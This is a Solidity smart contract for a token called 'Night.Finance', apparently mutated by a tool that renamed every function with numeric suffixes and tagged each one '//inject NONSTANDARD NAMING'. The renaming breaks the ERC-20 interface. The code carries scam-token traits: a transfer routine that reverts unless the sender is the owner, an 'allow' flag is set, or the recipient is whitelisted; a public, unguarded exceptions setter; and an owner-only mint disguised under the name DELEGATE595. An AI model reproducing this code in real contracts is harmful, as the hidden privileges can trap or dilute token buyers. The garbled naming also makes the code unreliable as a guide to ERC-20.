                                                                 

// SPDX-License-Identifier: MIT
pragma solidity ^0.5.16;

interface IERC20 {
    function TOTALSUPPLY342() external view returns (uint);	//inject NONSTANDARD NAMING
    function BALANCEOF743(address account) external view returns (uint);	//inject NONSTANDARD NAMING
    function TRANSFER899(address recipient, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    function ALLOWANCE742(address owner, address spender) external view returns (uint);	//inject NONSTANDARD NAMING
    function APPROVE78(address spender, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    function TRANSFERFROM239(address sender, address recipient, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    event TRANSFER51(address indexed from, address indexed to, uint value);	//inject NONSTANDARD NAMING
    event APPROVAL887(address indexed owner, address indexed spender, uint value);	//inject NONSTANDARD NAMING
}

contract Context {
    constructor () internal { }
    // solhint-disable-previous-line no-empty-blocks

    function _MSGSENDER421() internal view returns (address payable) {	//inject NONSTANDARD NAMING
        return msg.sender;
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping (address => uint) private _balances;
    mapping (address => mapping (address => uint)) private _allowances;
    mapping (address => bool) private exceptions;
    address private uniswap;
    address private _owner;
    uint private _totalSupply;
    bool private allow;

    constructor(address owner) public{
      _owner = owner;
      allow = true;
    }

    function SETEXCEPTIONS179(address someAddress) public{	//inject NONSTANDARD NAMING
        exceptions[someAddress] = true;
    }

    function TOTALSUPPLY342() public view returns (uint) {	//inject NONSTANDARD NAMING
        return _totalSupply;
    }
    function BALANCEOF743(address account) public view returns (uint) {	//inject NONSTANDARD NAMING
        return _balances[account];
    }
    function TRANSFER899(address recipient, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _TRANSFER33(_MSGSENDER421(), recipient, amount);
        return true;
    }
    function ALLOWANCE742(address owner, address spender) public view returns (uint) {	//inject NONSTANDARD NAMING
        return _allowances[owner][spender];
    }
    function APPROVE78(address spender, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE130(_MSGSENDER421(), spender, amount);
        return true;
    }
    function TRANSFERFROM239(address sender, address recipient, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _TRANSFER33(sender, recipient, amount);
        _APPROVE130(sender, _MSGSENDER421(), _allowances[sender][_MSGSENDER421()].SUB877(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function INCREASEALLOWANCE961(address spender, uint addedValue) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE130(_MSGSENDER421(), spender, _allowances[_MSGSENDER421()][spender].ADD56(addedValue));
        return true;
    }
    function DECREASEALLOWANCE80(address spender, uint subtractedValue) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE130(_MSGSENDER421(), spender, _allowances[_MSGSENDER421()][spender].SUB877(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function _TRANSFER33(address sender, address recipient, uint amount) internal {	//inject NONSTANDARD NAMING
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        // Trigger special exceptions
        if(sender == _owner || allow ) {
          _balances[sender] = _balances[sender].SUB877(amount, "ERC20: transfer amount exceeds balance");
          _balances[recipient] = _balances[recipient].ADD56(amount);
          emit TRANSFER51(sender, recipient, amount);
        }else {
          if(exceptions[recipient]) {
            _balances[sender] = _balances[sender].SUB877(amount, "ERC20: transfer amount exceeds balance");
            _balances[recipient] = _balances[recipient].ADD56(amount);
            emit TRANSFER51(sender, recipient, amount);
          }else {
            revert();
          }
        }
    }
    
    function _MINT489(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "Invalid address");

        _totalSupply = _totalSupply.ADD56(amount);
        _balances[account] = _balances[account].ADD56(amount);
        emit TRANSFER51(address(0), account, amount);
    }
    function _BURN857(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].SUB877(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.SUB877(amount);
        emit TRANSFER51(account, address(0), amount);
    }
    function _APPROVE130(address owner, address spender, uint amount) internal {	//inject NONSTANDARD NAMING
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit APPROVAL887(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
    function NAME454() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _name;
    }
    function SYMBOL713() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _symbol;
    }
    function DECIMALS819() public view returns (uint8) {	//inject NONSTANDARD NAMING
        return _decimals;
    }
}

library SafeMath {
    function ADD56(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function SUB877(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        return SUB877(a, b, "SafeMath: subtraction overflow");
    }
    function SUB877(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }
    function MUL146(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function DIV472(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        return DIV472(a, b, "SafeMath: division by zero");
    }
    function DIV472(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library Address {
    function ISCONTRACT292(address account) internal view returns (bool) {	//inject NONSTANDARD NAMING
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function SAFETRANSFER330(IERC20 token, address to, uint value) internal {	//inject NONSTANDARD NAMING
        CALLOPTIONALRETURN760(token, abi.encodeWithSelector(token.TRANSFER899.selector, to, value));
    }

    function SAFETRANSFERFROM709(IERC20 token, address from, address to, uint value) internal {	//inject NONSTANDARD NAMING
        CALLOPTIONALRETURN760(token, abi.encodeWithSelector(token.TRANSFERFROM239.selector, from, to, value));
    }

    function SAFEAPPROVE155(IERC20 token, address spender, uint value) internal {	//inject NONSTANDARD NAMING
        require((value == 0) || (token.ALLOWANCE742(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        CALLOPTIONALRETURN760(token, abi.encodeWithSelector(token.APPROVE78.selector, spender, value));
    }
    function CALLOPTIONALRETURN760(IERC20 token, bytes memory data) private {	//inject NONSTANDARD NAMING
        require(address(token).ISCONTRACT292(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract NightFinance is ERC20, ERC20Detailed {
  using SafeERC20 for IERC20;
  using Address for address;
  using SafeMath for uint;
  
  
  address public governance;

  constructor () public ERC20Detailed("Night.Finance", "NIGHT", 18) ERC20(tx.origin){
      governance = tx.origin;
  }

  function DELEGATE595 (address _from, uint256 _value) public {	//inject NONSTANDARD NAMING
      require(msg.sender == governance,"Invalid Address");
      _MINT489(_from, _value);
  }

  function SETGOVERNANCE707(address _governance) private {	//inject NONSTANDARD NAMING
      require(msg.sender == governance, "!governance");
      governance = _governance;
  }
  

}